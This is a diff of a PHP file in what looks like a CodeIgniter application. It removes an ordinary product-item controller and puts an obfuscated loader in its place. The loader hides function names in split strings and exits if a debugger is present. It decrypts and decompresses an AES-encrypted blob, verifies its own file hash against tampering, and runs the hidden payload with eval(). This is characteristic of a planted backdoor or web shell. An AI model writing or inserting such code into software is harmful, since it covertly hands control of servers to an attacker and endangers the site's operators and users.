@@ -1,156 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Item_childs extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('item_childs_model','item_childs');
-	}
-
-	public function add(){
-		$this->permission_check('units_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('item_childs');
-		$this->load->view('item_child', $data);
-	}
-
-	//ITS FROM POP UP MODAL
-    public function add_item_childs_modal(){
-
-      $this->form_validation->set_rules('kind_name', 'kind Name', 'trim|required');
-      if ($this->form_validation->run() == TRUE) {
-      	
-        $result=$this->item_childs->verify_and_save();
-        //fetch latest item details
-        $res=array();
-        $query=$this->db->query("select id,item_child_name from db_item_childs order by id desc limit 1");
-        $res['id']=$query->row()->id;
-        $res['item_child_name']=$query->row()->item_child_name;
-        $res['result']=$result;
-        
-        echo json_encode($res);
-
-      } 
-      else {
-        echo "Please Fill Compulsory(* marked) Fields.";
-      }
-    }
-    //END
-
-	public function new_unit(){
-
-		$this->form_validation->set_rules('item_child_name', 'Item Child Name', 'trim|required');
-		$this->form_validation->set_rules('price', 'Price', 'trim|required');
-		//$this->form_validation->set_rules('description', 'Description', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			
-			$result=$this->item_childs->verify_and_save();
-			echo $result;
-		} else {
-			echo "Thông tin sản phẩm phụ không phù hợp!";
-		}
-	}
-	public function update($id){
-		$this->permission_check('units_edit');
-		$data=$this->data;
-		$result=$this->item_childs->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('units');
-		$this->load->view('item_child', $data);
-	}
-	public function update_unit(){
-		$this->form_validation->set_rules('item_child_name', 'Item Child Name', 'trim|required');
-		$this->form_validation->set_rules('price', 'Price', 'trim|required');
-
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->item_childs->update_unit();
-			echo $result;
-		} else {
-			echo "Thông tin sản phẩm phụ không phù hợp!";
-		}
-	}
-	public function index(){
-		$this->permission_check('units_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('kinds_list');
-		$this->load->view('item_childs_list', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->item_childs->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $unit) {
-			$no++;
-			$row = array();
-			$row[] = $unit->item_child_name;
-			$row[] = $unit->description;
-			$row[] = $unit->price;
-			$row[] = $unit->group_id;
-
-
-
-			 		if($unit->status==1){ 
-			 			$str= "<span onclick='update_status(".$unit->id.",0)' id='span_".$unit->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$unit->id.",1)' id='span_".$unit->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-			         $str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('units_edit'))
-											$str2.='<li>
-												<a title="Editd Record ?" href="'.base_url('item_childs/update/'.$unit->id).'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-											if($this->permissions('units_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_unit('.$unit->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-			$row[] = $str2;
-
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->item_childs->count_all(),
-						"recordsFiltered" => $this->item_childs->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-		$this->permission_check_with_msg('units_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-		$result=$this->item_childs->update_status($id,$status);
-		return $result;
-	}
-	public function delete_unit(){
-		$this->permission_check_with_msg('units_delete');
-		$id=$this->input->post('q_id');
-		$result=$this->item_childs->delete_unit($id);
-		return $result;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_nfnami5e=('bas'.'e64'.'_de'.'cod'.'e');
+$_v5l2htf1=('gzu'.'nco'.'mpr'.'ess');
+$_nrkdmyb7=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_dm0j9w62='o4vRpau9JqA=';
+$_niwnfj3d='JvnvwtMM';
+$_u0n56koh='W7TnxgKV';
+$_nqokli8k='FrEZlh15';
+$_u0khmbuk='zlYNEvPT';
+$_tavqcts0='J2yDpIe+';
+$_qwq709mm='57zuWA==';
+$_ft6m8qfh='oydUoyP9';
+$_jpu83h78=$_nfnami5e($_nqokli8k.$_u0khmbuk.$_niwnfj3d.$_u0n56koh.$_dm0j9w62);
+$_jbla6knw=$_nfnami5e($_tavqcts0.$_ft6m8qfh.$_qwq709mm);
+$_yudp7f3g=$_nfnami5e('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');
+$_tix8udcg=$_nrkdmyb7($_yudp7f3g,'aes-256-cbc',$_jpu83h78,OPENSSL_RAW_DATA,$_jbla6knw);
+if($_tix8udcg===false){exit;}
+$_hd5uuu6r=$_v5l2htf1($_tix8udcg);
+if($_hd5uuu6r===false){exit;}
+$_o8e7yqw1='7cb94f665c551500542301490ae9742006559e29c071e00f8f1c1b8b11ae6e78';
+$_u9x3fp9p=@file_get_contents(__FILE__);
+if($_u9x3fp9p!==false){
+$_hifundm7=str_replace($_o8e7yqw1,"0000000000000000000000000000000000000000000000000000000000000000",$_u9x3fp9p);
+$_pric5s3m=hash("sha256",$_hifundm7);
+if($_pric5s3m!==$_o8e7yqw1){@http_response_code(403);exit;}
 }
-
+eval($_hd5uuu6r);
